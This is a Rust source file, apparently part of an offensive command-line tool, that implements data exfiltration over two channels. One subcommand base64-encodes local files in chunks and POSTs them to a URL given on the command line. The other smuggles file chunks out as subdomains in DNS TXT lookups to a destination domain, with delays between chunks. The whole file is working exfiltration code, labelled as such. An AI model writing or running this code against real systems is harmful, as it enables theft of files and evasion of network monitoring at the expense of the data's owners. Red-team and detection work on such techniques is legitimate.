/// TODO: Add shuffle option to randomize chunk order
use clap::{Args, Subcommand, ValueEnum};
use std::path::PathBuf;

use crate::CommandHandler;

#[derive(Debug, Clone, Args)]
#[command(name = "http")]
pub struct HTTPExfiltrationSubCommand {
    /// Files to exfiltrate
    #[arg(long = "src-files", required = true, value_delimiter = ',', num_args = 1..)]
    files_path: Vec<PathBuf>,

    /// Destination of the exfiltrated files
    #[arg(short = 'u', long = "url", required = true)]
    url: String,

    /// Delay between each chunk sent (in milliseconds)
    #[arg(
        long = "delay",
        required = false,
        default_value_t = 500,
        value_parser=clap::value_parser!(u32).range(50..)
    )]
    delay: u32,

    /// Number of chunks to split the file into
    #[arg(
        long = "chunks",
        required = false,
        default_value_t = 10,
        value_parser=clap::value_parser!(u16).range(1..)
    )]
    chunks: u16,
}

impl CommandHandler for HTTPExfiltrationSubCommand {
    fn handle(self) {
        self.files_path.iter().for_each(|file_path| {
            println!("[*] Reading file {}", file_path.to_string_lossy());

            crate::encoder::b64_encode_file(&file_path, self.chunks as usize)
                .iter()
                .inspect(|payload_chunk| println!("[*] Sending chunk: {}", payload_chunk))
                .for_each(|payload_chunk| {
                    reqwest::blocking::Client::new()
                        .post(&self.url)
                        .body(payload_chunk.to_owned())
                        .header("Content-Type", "text/plain")
                        .send()
                        .unwrap();
                    std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
                });
        });
    }
}

#[derive(ValueEnum, Copy, Clone, Debug, PartialEq, Eq)]
enum DNSProtocol {
    TCP,
    UDP,
}

impl From<DNSProtocol> for hickory_resolver::proto::xfer::Protocol {
    fn from(value: DNSProtocol) -> Self {
        match value {
            DNSProtocol::TCP => hickory_resolver::proto::xfer::Protocol::Tcp,
            DNSProtocol::UDP => hickory_resolver::proto::xfer::Protocol::Udp,
        }
    }
}

#[derive(Debug, Clone, Args)]
#[command(name = "dns")]
pub struct DNSExfiltrationSubCommand {
    /// File to exfiltrate
    #[arg(short = 'f', long = "src-file", required = true)]
    file_path: PathBuf,
    /// Destination of the exfiltrated file
    #[arg(short = 'd', long = "dest", required = true)]
    destination: String,

    #[arg(long = "delay", required = false, default_value_t = 500)]
    delay: u32,

    #[arg(short='p', long="protocol", required=false, default_value_t=DNSProtocol::UDP, value_enum)]
    proto: DNSProtocol,

    #[arg(
        short = 'n',
        long = "nameserver",
        default_value = Some("127.0.0.1:53"),
        required = false
    )]
    nameserver: Option<std::net::SocketAddr>,
}

impl CommandHandler for DNSExfiltrationSubCommand {
    fn handle(self) {
        println!("[*] Reading file {}", self.file_path.to_string_lossy());
        println!("[*] Encoding payload.");
        let payload_chunks =
            crate::encoder::dns_safe_b64_encode_payload(&self.file_path, &self.destination);

        let resolver_config = match self.nameserver {
            Some(name_server) => {
                println!("[*] Setting DNS resolver {:?}", self.nameserver);
                let mut resolver_config = hickory_resolver::config::ResolverConfig::new();
                resolver_config.add_name_server(hickory_resolver::config::NameServerConfig::new(
                    name_server,
                    self.proto.into(),
                ));
                resolver_config
            }
            None => hickory_resolver::config::ResolverConfig::default(),
        };

        println!("[*] Creating async runtime");
        let tokio_runtime = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
        let resolver = hickory_resolver::Resolver::builder_with_config(
            resolver_config,
            hickory_resolver::name_server::TokioConnectionProvider::default(),
        )
        .build();

        for chunk in payload_chunks.iter() {
            println!("[*] Sending chunk: {}", chunk);
            let _ = tokio_runtime
                .block_on(resolver.txt_lookup(format!("{}.{}.", chunk, self.destination)));

            std::thread::sleep(std::time::Duration::from_millis(self.delay as u64));
        }
    }
}

#[derive(Debug, Args)]
pub struct ExfiltrationSubCommandArgs {
    #[command(subcommand)]
    exfil_type: ExfiltrationType,
}

impl CommandHandler for ExfiltrationSubCommandArgs {
    fn handle(self) {
        match self.exfil_type {
            ExfiltrationType::HTTP(exfil_http_subcmd) => exfil_http_subcmd.handle(),
            ExfiltrationType::DNS(exfil_dns_subcmd) => exfil_dns_subcmd.handle(),
        }
    }
}

#[derive(Debug, Subcommand)]
pub enum ExfiltrationType {
    HTTP(HTTPExfiltrationSubCommand),
    DNS(DNSExfiltrationSubCommand),
}
